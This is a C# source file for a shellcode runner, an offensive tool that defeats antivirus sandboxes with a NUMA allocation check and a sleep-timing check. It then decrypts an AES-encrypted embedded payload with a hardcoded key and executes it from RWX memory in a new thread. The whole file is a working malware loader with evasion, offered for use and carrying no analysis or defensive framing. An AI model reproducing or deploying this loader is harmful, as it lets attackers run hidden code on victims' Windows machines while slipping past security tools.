﻿using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;


namespace ShellcodeRunner
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        static string DecryptStringFromBytes(byte[] cipherText, byte[] key)
        {
            string decrypted;
            using (AesCryptoServiceProvider aes = new AesCryptoServiceProvider())
            {
                aes.Key = key;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                using (MemoryStream msDecryptor = new MemoryStream(cipherText))
                {
                    byte[] readIV = new byte[16];
                    msDecryptor.Read(readIV, 0, 16);
                    aes.IV = readIV;
                    ICryptoTransform decoder = aes.CreateDecryptor();
                    using (CryptoStream csDecryptor = new CryptoStream(msDecryptor, decoder, CryptoStreamMode.Read))
                    using (StreamReader srReader = new StreamReader(csDecryptor))
                    {
                        decrypted = srReader.ReadToEnd();
                    }
                }
            }
            return decrypted;
        }
        static void Main(string[] args)
        {
            //Antimalware evasion stuff
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }
            //

            byte[] key = new byte[32] {
                    0xf0,0x59,0xed,0x11,0xe7,0x8d,0x7a,0xaf,0xf6,0xe9,0xb4,0x57,
                    0x10,0x80,0xe2,0xee,0xc3,0x09,0x93,0x6b,0x45,0x2a,0x86,0x09,
                    0x54,0x33,0xb1,0x51,0x06,0x79,0xd8,0x6b
            };

            byte[] buf = new byte[848] {
                    0xa8,0x1f,0xb3,0x8d,0xb5,0xfe,0x4c,0x5a,0xe5,0xee,0x8b,0xb0,
                    0xb8,0x78,0xeb,0x20,0x37,0xab,0xbf,0x82,0xda,0x53,0x0d,0x69,
                    0xd7,0x35,0xb1,0x6b,0x99,0xa2,0x6b,0xb7,0x89,0xbb,0x4d,0x9f,
                    0x9d,0x10,0xd2,0x88,0xb1,0x17,0x5e,0x5c,0xb7,0x99,0x72,0xd9,
                    0x65,0xec,0xc6,0x7f,0x7f,0xd4,0x93,0x02,0x4b,0x31,0x20,0x12,
                    0x9c,0x83,0xc4,0xd2,0x46,0xf6,0x99,0x92,0x82,0xbc,0x48,0x5c,
                    0x2c,0x54,0x9c,0x39,0xcd,0x1d,0x14,0x14,0x1a,0x38,0xfe,0x01,
                    0xcd,0xf7,0x91,0xc9,0xd7,0x31,0x34,0x62,0x4c,0xdf,0x40,0x2b,
                    0x7a,0xd7,0x59,0x0b,0x64,0x4c,0xef,0xec,0x27,0xcb,0x0c,0x92,
                    0x41,0xa3,0x83,0xb6,0x7f,0x4b,0x31,0x72,0x4c,0x50,0xdb,0x67,
                    0x0b,0xec,0xc8,0x49,0x5d,0xab,0x1c,0x40,0x59,0x9d,0x88,0xea,
                    0x16,0x55,0x43,0x95,0xb7,0xbc,0x55,0x72,0x06,0xef,0x3a,0x65,
                    0xaa,0x1a,0xc3,0x2d,0x44,0xda,0x79,0x03,0x2b,0x1b,0xa6,0xfa,
                    0xc2,0x3e,0xcb,0xf5,0x48,0x12,0x47,0x4d,0xad,0xbb,0xf8,0x79,
                    0x4d,0xb6,0xde,0xa0,0xd7,0xc6,0x4c,0x1a,0x61,0x57,0x7d,0xe3,
                    0x19,0x04,0xac,0xb7,0x60,0xcf,0x1e,0x2b,0x73,0x17,0x67,0xad,
                    0xeb,0xb9,0x2e,0x93,0x7c,0xf9,0x08,0xbc,0x8d,0x6f,0x90,0x0a,
                    0x6f,0xce,0xc6,0x00,0x1b,0xf9,0x29,0x87,0x49,0x43,0xed,0xd9,
                    0xd4,0x4f,0x68,0x12,0x35,0xe3,0x9f,0xb1,0xbb,0x4f,0xad,0xa1,
                    0x71,0xa7,0xcd,0xfc,0xc4,0x07,0xe3,0x98,0xcb,0x23,0xea,0xe9,
                    0x53,0xc0,0x1e,0x7d,0x57,0xbf,0xf7,0xb3,0x19,0xe5,0x58,0xfa,
                    0x91,0x8e,0x67,0x92,0xb9,0x15,0xe2,0x3f,0x4c,0x1c,0x9b,0x36,
                    0xf3,0x71,0xd3,0xda,0x0d,0x82,0x2a,0xb8,0xa4,0x4b,0x39,0xe8,
                    0x20,0x4c,0x6a,0xd0,0x23,0xef,0x07,0x6b,0xe3,0xa8,0x3b,0x35,
                    0xf3,0x13,0x9a,0x7e,0xbd,0xb6,0x0b,0xb8,0x35,0xe2,0x18,0x6f,
                    0xd9,0xf6,0x80,0xca,0x3b,0xd5,0xdf,0xf7,0xa5,0xb6,0xc9,0xa0,
                    0x19,0xd8,0x15,0xe7,0x75,0x5c,0x3f,0xa1,0x3b,0xa0,0x58,0xfb,
                    0x39,0xc9,0xc7,0x48,0x7f,0xea,0x7b,0x18,0x37,0x8b,0x1b,0xfd,
                    0xbe,0xff,0x02,0xcb,0x29,0x03,0x95,0x18,0x0b,0x3e,0x1a,0x07,
                    0xdd,0xf7,0x26,0x20,0xb6,0x28,0x5f,0x11,0x5f,0x4b,0x80,0x0f,
                    0x80,0x9a,0x4a,0xf0,0xd2,0x9e,0x74,0x74,0x0f,0x5c,0x0c,0x9d,
                    0x24,0x32,0xd5,0x06,0xe6,0xd6,0x89,0x88,0x7c,0xc4,0xa3,0x06,
                    0xf4,0x43,0xa5,0x84,0x9c,0xbf,0xa4,0xa2,0xda,0x89,0x37,0x44,
                    0x64,0xc2,0x98,0x3c,0x7d,0x0b,0xcf,0x31,0xe4,0x6a,0xd1,0x6e,
                    0x00,0xe0,0xd4,0xce,0xca,0x27,0xcb,0x7a,0xd4,0x60,0xa9,0x78,
                    0xbf,0xe0,0x52,0xe2,0x2a,0xb5,0xd9,0x81,0x1e,0x9a,0xa8,0x56,
                    0xd0,0x23,0xd7,0x35,0x5d,0xfb,0x85,0x88,0xc5,0xe8,0xc5,0x21,
                    0x76,0x0a,0xbc,0xd8,0x6f,0x58,0xfc,0xba,0xbc,0x9d,0x00,0x7e,
                    0xd0,0xba,0xb5,0x04,0x58,0x19,0xc7,0x40,0x37,0x23,0xb3,0xbe,
                    0xb9,0xbb,0xc8,0x9f,0x2a,0xb6,0x03,0x37,0xe3,0xcb,0xc1,0x35,
                    0x7c,0xac,0x96,0xfa,0xbe,0x5b,0x13,0xd6,0x5e,0x27,0xa8,0xbc,
                    0xb7,0xaf,0x25,0xde,0x4d,0x55,0x13,0x61,0xa4,0x63,0x00,0xde,
                    0x71,0x54,0x9d,0x0d,0x4d,0x62,0x3e,0x01,0x9e,0xa8,0x63,0x09,
                    0xd3,0xc8,0xec,0x2a,0x6a,0x52,0x2c,0xcd,0x61,0x44,0x62,0x0e,
                    0x35,0xc2,0x0f,0x0e,0xed,0x8a,0x2d,0x69,0xec,0x7b,0x84,0xfb,
                    0x58,0x9d,0x55,0x6b,0x1c,0x01,0x6b,0xaf,0x62,0x4c,0x9d,0xb7,
                    0xc4,0xdb,0xb5,0xc8,0x5f,0x3a,0xa1,0x61,0xa6,0x19,0xb8,0x6a,
                    0xd6,0x5b,0xe1,0x6d,0xd1,0x81,0x16,0x67,0x40,0x19,0x9f,0x43,
                    0x5d,0x2f,0xe8,0x8e,0x62,0xa3,0x66,0x32,0x2a,0x0f,0x31,0x65,
                    0x65,0x90,0x83,0x70,0x60,0x61,0x0c,0x20,0xe8,0x78,0x8f,0xd9,
                    0x9a,0xd3,0x47,0xe9,0x03,0x6b,0x4b,0xcd,0x1c,0xb6,0x6c,0xc0,
                    0x8a,0x8a,0x49,0xd6,0xe4,0x09,0xc6,0x64,0x66,0x63,0xea,0x54,
                    0x6d,0xc8,0x8e,0x22,0x79,0x4a,0xb6,0x2a,0x65,0x6b,0x64,0xb2,
                    0x4b,0xc1,0x0b,0x2e,0x0a,0xdd,0xce,0x9d,0x63,0x6b,0x7a,0xfb,
                    0x5c,0x49,0xa2,0x93,0xae,0x48,0x07,0x4f,0xc2,0x48,0xd1,0x11,
                    0xb2,0xce,0xf6,0xb2,0xad,0x04,0x4a,0x8e,0x74,0x0c,0xd8,0x3c,
                    0x66,0x59,0xa9,0xa0,0xa1,0xa7,0x9d,0x5c,0x60,0x42,0xf9,0x16,
                    0x36,0xaf,0x75,0x99,0x6f,0x68,0xc3,0x7d,0xf4,0x8b,0x48,0xbe,
                    0xa0,0xd5,0x60,0x4e,0xaf,0xa2,0xbf,0xe8,0x59,0x46,0x0a,0xff,
                    0x8f,0x63,0x31,0x65,0x6e,0x12,0x85,0x58,0x5b,0x64,0x15,0x72,
                    0x21,0x77,0x5f,0x4d,0xfd,0x1d,0x50,0x26,0x18,0x18,0x27,0x7d,
                    0xaf,0xa5,0x55,0x60,0x53,0x30,0x9a,0xe6,0x34,0x03,0xfd,0x63,
                    0x1d,0xc9,0x47,0xa0,0x72,0xb0,0x1e,0x1d,0xd1,0x8a,0x2e,0x1b,
                    0x30,0x57,0x4b,0x29,0xb0,0x21,0x33,0xe8,0x61,0x57,0xa4,0x2c,
                    0xbf,0x10,0xa0,0x07,0x88,0xf9,0x0e,0x92,0x6e,0xa8,0xf7,0x41,
                    0xd2,0xbf,0xc9,0x9e,0x86,0x42,0xa7,0xd0,0xbe,0xef,0xf0,0x0b,
                    0x97,0x10,0xcc,0x58,0x2c,0xac,0xaf,0x34,0x7b,0x57,0xe5,0xfc,
                    0x32,0x8c,0x38,0xbd,0xd4,0x00,0x99,0x02,0x5b,0x20,0xec,0xde,
                    0x94,0xd3,0x57,0x58,0x36,0x66,0x67,0x41,0x24,0x65,0xce,0x79,
                    0xf0,0x5f,0x3d,0xcc,0xc1,0x33,0xb0,0xaf,0x6a,0xd6,0x7f,0x37,
                    0x9e,0x0f,0x23,0xac,0x27,0x2a,0xf4,0x5d,
            };

            string decrypted = DecryptStringFromBytes(buf, key);

            string[] decryptedArray = decrypted.Split('-');
            byte[] shellcode = new byte[decryptedArray.Length];

            for (int i = 0; i < decryptedArray.Length; i++)
            {
                shellcode[i] = Convert.ToByte(decryptedArray[i], 16);
            }

            Console.WriteLine($"[+] Payload decrypted.");

            int size = shellcode.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (UInt32)size, 0x3000, 0x40);
            Console.WriteLine($"[+] Got allocated memory for shellcode: 0x{(long)addr:X}.");

            Marshal.Copy(shellcode, 0, addr, size);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            Console.WriteLine($"[+] Created thread starting in 0x{(long)addr:X}: 0x{(long)hThread:X}.");
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}